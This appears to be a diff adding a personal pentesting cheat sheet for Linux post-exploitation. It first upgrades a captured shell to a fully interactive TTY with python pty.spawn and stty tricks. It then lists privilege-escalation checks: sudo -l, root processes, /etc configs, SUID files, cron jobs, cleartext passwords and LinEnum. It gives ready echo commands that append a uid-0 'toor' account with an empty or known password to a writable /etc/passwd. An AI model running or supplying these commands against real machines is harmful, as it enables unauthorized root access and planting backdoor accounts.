@@ -1,0 +1,79 @@
+first and foremost make it fully interactive :
+
+
+> check if python installed .
+               python --version
+               
+>   python -c 'import pty; pty.spawn("/bin/bash")'
+
+> ctrl + z
+
+> stty raw -echo
+
+> fg
+
+>reset
+
+>BOOM!
+
+( extra :  export SHELL=bash
+        export TERM=xterm256-color
+        stty rows 24 columns 80 (take from kali run : stty -a) ( pre config : chill! copy paste :) )
+        
+        
+        
+        
+        
+finally : seen priv esc techniques.
+
+
+0. run :  uname -a (note for kernal and other important details , for kernal exploit last resort)
+
+1.  sudo -l ( can we run any commands as root)
+
+           if yes : exploit!
+           
+           
+ 2. check process running as root :
+ 
+           ps -aux | grep root
+           
+           
+           key points : check for user service running as root.
+                             ex : mysql running as root without password 
+                             
+                             
+  3. check under /etc for interesting configs.
+  
+  
+  4. is /etc/passwd writable? or shadow file visible? (ROOT!)
+  
+  
+             if yes add this line at end and we will be root!
+             
+                   in efficient way :               echo "toor::0:0:toor:/root:/bin/bash" >> /etc/passwd 
+             
+             
+             efficient way : 
+             
+             
+             echo "toor1:aaKNIEDOaueR6:0:0:toor:/root:/bin/bash" >> /etc/passwd
+             
+             
+             then su toor1
+             pass : foo
+              
+  
+  5 .  run privesc scripts to automate the findings .
+               > ./LinEnum.sh -t
+  
+  
+              main notes : 
+                              SUID files
+                              SGID files
+                              Cron jobs
+                              world writable files owned by root
+                              process run by root
+                              check for cleartext passwords in config files . ( for example . for wordpress -> wp-config.php )
+                                              
+    6. if nothing interesting check gotmilk page for re enumeration. 
